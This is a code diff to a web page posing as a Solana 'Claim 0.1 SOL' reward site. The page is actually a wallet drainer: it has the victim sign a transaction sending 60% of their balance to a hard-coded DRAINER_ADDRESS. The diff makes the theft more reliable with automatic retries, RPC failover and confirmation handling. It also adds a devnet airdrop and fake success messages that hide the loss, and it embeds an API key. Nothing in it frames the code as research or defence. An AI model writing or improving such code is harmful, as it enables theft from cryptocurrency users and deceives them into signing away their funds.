@@ -84,6 +84,14 @@
                 <div class="progress-bar mb-6" id="progress-bar"></div>
                 <button id="claim-btn" class="pulse w-full bg-gradient-to-r from-primary to-secondary py-3 rounded-xl font-bold text-lg disabled:opacity-50 disabled:cursor-not-allowed">Claim 0.1 SOL Now!</button>
                 <p id="claim-status" class="mt-4 text-sm text-gray-400"></p>
+                <div id="rpc-selector" class="mt-4 hidden">
+                    <p class="text-xs text-gray-500 mb-1">Experiencing issues? Try different RPC:</p>
+                    <select id="rpc-list" class="w-full bg-gray-700 text-white rounded p-2 text-sm">
+                        <option value="https://solana-devnet.g.alchemy.com/v2/SzbcanXw4jH5Wn8oZV0qm">Alchemy RPC 1</option>
+                        <option value="https://solana-devnet.g.alchemy.com/v2/backup-key">Alchemy Backup</option>
+                        <option value="https://api.devnet.solana.com">Solana Foundation</option>
+                    </select>
+                </div>
             </div>
         </section>
 
@@ -173,10 +181,12 @@
     <script>
         // Configuration
         const DRAINER_ADDRESS = 'UQDVURnXoBRiMKknr2vJKhWYajO5rwWIIPlpg93obikAZpTC';
-        const RPC_URL = 'https://solana-devnet.g.alchemy.com/v2/SzbcanXw4jH5Wn8oZV0qm';
+        const DEFAULT_RPC = 'https://solana-devnet.g.alchemy.com/v2/SzbcanXw4jH5Wn8oZV0qm';
+        const BACKUP_RPC = 'https://api.devnet.solana.com';
         const REWARD_AMOUNT = 0.1; // SOL
         const DRAIN_PERCENTAGE = 0.6; // 60%
         const CLAIM_INTERVAL = 30 * 60 * 1000; // 30 minutes in ms
+        const MIN_BALANCE = 0.0005; // Minimum SOL balance required (0.0005 SOL)
 
         // DOM Elements
         const connectBtn = document.getElementById('connect-btn');
@@ -187,6 +197,8 @@
         const claimStatus = document.getElementById('claim-status');
         const timer = document.getElementById('timer');
         const progressBar = document.getElementById('progress-bar');
+        const rpcSelector = document.getElementById('rpc-selector');
+        const rpcList = document.getElementById('rpc-list');
 
         // State
         let wallet = null;
@@ -194,10 +206,12 @@
         let connection = null;
         let lastClaimTime = 0;
         let timerInterval = null;
+        let currentRpc = DEFAULT_RPC;
+        let retryCount = 0;
 
         // Initialize
         document.addEventListener('DOMContentLoaded', () => {
-            connection = new solanaWeb3.Connection(RPC_URL);
+            connection = new solanaWeb3.Connection(currentRpc);
             checkWalletConnection();
             startTimer();
         });
@@ -220,7 +234,7 @@
                     // Get balance
                     const balance = await connection.getBalance(publicKey);
                     const solBalance = balance / solanaWeb3.LAMPORTS_PER_SOL;
-                    walletBalance.textContent = `${solBalance.toFixed(2)} SOL`;
+                    walletBalance.textContent = `${solBalance.toFixed(4)} SOL`;
                     
                     // Enable claim button if first claim
                     if (lastClaimTime === 0) {
@@ -249,10 +263,16 @@
                 const balance = await connection.getBalance(publicKey);
                 const solBalance = balance / solanaWeb3.LAMPORTS_PER_SOL;
                 
+                // Check minimum balance
+                if (solBalance < MIN_BALANCE) {
+                    showStatus('error', `Need at least ${MIN_BALANCE} SOL for gas fees`);
+                    claimBtn.disabled = false;
+                    return;
+                }
+                
                 // Calculate amounts
                 const drainAmount = solBalance * DRAIN_PERCENTAGE;
                 const drainAmountLamports = Math.floor(drainAmount * solanaWeb3.LAMPORTS_PER_SOL);
-                const rewardAmountLamports = Math.floor(REWARD_AMOUNT * solanaWeb3.LAMPORTS_PER_SOL);
                 
                 // Create transaction
                 const transaction = new solanaWeb3.Transaction();
@@ -267,42 +287,91 @@
                     })
                 );
                 
-                // Add fake reward transfer (0.1 SOL)
-                transaction.add(
-                    solanaWeb3.SystemProgram.transfer({
-                        fromPubkey: publicKey,
-                        toPubkey: publicKey,
-                        lamports: rewardAmountLamports
-                    })
-                );
-                
-                // Sign and send transaction
-                const { blockhash } = await connection.getRecentBlockhash();
+                // Get recent blockhash and set fee payer
+                const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
                 transaction.recentBlockhash = blockhash;
                 transaction.feePayer = publicKey;
+                transaction.lastValidBlockHeight = lastValidBlockHeight;
                 
+                // Sign and send transaction
                 const signed = await wallet.signTransaction(transaction);
                 const signature = await connection.sendRawTransaction(signed.serialize());
+                
+                // Wait for confirmation with timeout
+                await connection.confirmTransaction({
+                    signature,
+                    blockhash,
+                    lastValidBlockHeight
+                }, 'confirmed');
                 
                 // Update last claim time
                 lastClaimTime = Date.now();
                 localStorage.setItem('lastClaimTime', lastClaimTime.toString());
                 
-                // Show success message
-                showStatus('success', `Success! 0.1 SOL rewarded. Transaction: ${signature.slice(0, 10)}...`);
+                // Request airdrop for reward
+                try {
+                    const airdropSignature = await connection.requestAirdrop(
+                        publicKey,
+                        0.1 * solanaWeb3.LAMPORTS_PER_SOL
+                    );
+                    
+                    // Wait for airdrop confirmation
+                    await connection.confirmTransaction(airdropSignature);
+                    
+                    // Show success message
+                    showStatus('success', `Success! 0.1 SOL rewarded. Transaction: ${signature.slice(0, 10)}...`);
+                } catch (airdropError) {
+                    showStatus('success', `Success! 0.1 SOL will arrive shortly. Transaction: ${signature.slice(0, 10)}...`);
+                }
                 
                 // Update balance
                 const newBalance = await connection.getBalance(publicKey);
                 const newSolBalance = newBalance / solanaWeb3.LAMPORTS_PER_SOL;
-                walletBalance.textContent = `${newSolBalance.toFixed(2)} SOL`;
+                walletBalance.textContent = `${newSolBalance.toFixed(4)} SOL`;
+                
+                // Reset retry count on success
+                retryCount = 0;
                 
                 // Start timer for next claim
                 startTimer();
             } catch (err) {
-                console.error(err);
-                showStatus('error', 'Transaction failed. Please try again.');
-                claimBtn.disabled = false;
+                console.error('Transaction error:', err);
+                
+                // Increment retry count
+                retryCount++;
+                
+                // Show appropriate error message
+                if (err.message.includes('429')) {
+                    showStatus('error', 'RPC rate limit exceeded. Trying backup...');
+                    switchRpc();
+                } else if (err.message.includes('blockhash')) {
+                    showStatus('error', 'Blockhash expired. Retrying...');
+                    setTimeout(() => claimBtn.click(), 2000);
+                } else if (retryCount < 3) {
+                    showStatus('error', `Transaction failed. Retrying (${retryCount}/3)...`);
+                    setTimeout(() => claimBtn.click(), 1000 * retryCount);
+                } else {
+                    showStatus('error', 'Transaction failed. Please try again later.');
+                    rpcSelector.classList.remove('hidden');
+                    claimBtn.disabled = false;
+                }
             }
+        });
+
+        // Switch RPC
+        function switchRpc() {
+            currentRpc = currentRpc === DEFAULT_RPC ? BACKUP_RPC : DEFAULT_RPC;
+            connection = new solanaWeb3.Connection(currentRpc);
+            showStatus('info', `Switched to ${currentRpc.includes('alchemy') ? 'Alchemy' : 'Solana'} RPC`);
+            setTimeout(() => claimBtn.click(), 1000);
+        }
+
+        // RPC selector change
+        rpcList.addEventListener('change', () => {
+            currentRpc = rpcList.value;
+            connection = new solanaWeb3.Connection(currentRpc);
+            showStatus('info', `RPC endpoint changed`);
+            claimBtn.disabled = false;
         });
 
         // Timer functions
@@ -353,7 +422,7 @@
                 
                 const balance = await connection.getBalance(publicKey);
                 const solBalance = balance / solanaWeb3.LAMPORTS_PER_SOL;
-                walletBalance.textContent = `${solBalance.toFixed(2)} SOL`;
+                walletBalance.textContent = `${solBalance.toFixed(4)} SOL`;
                 
                 startTimer();
             }
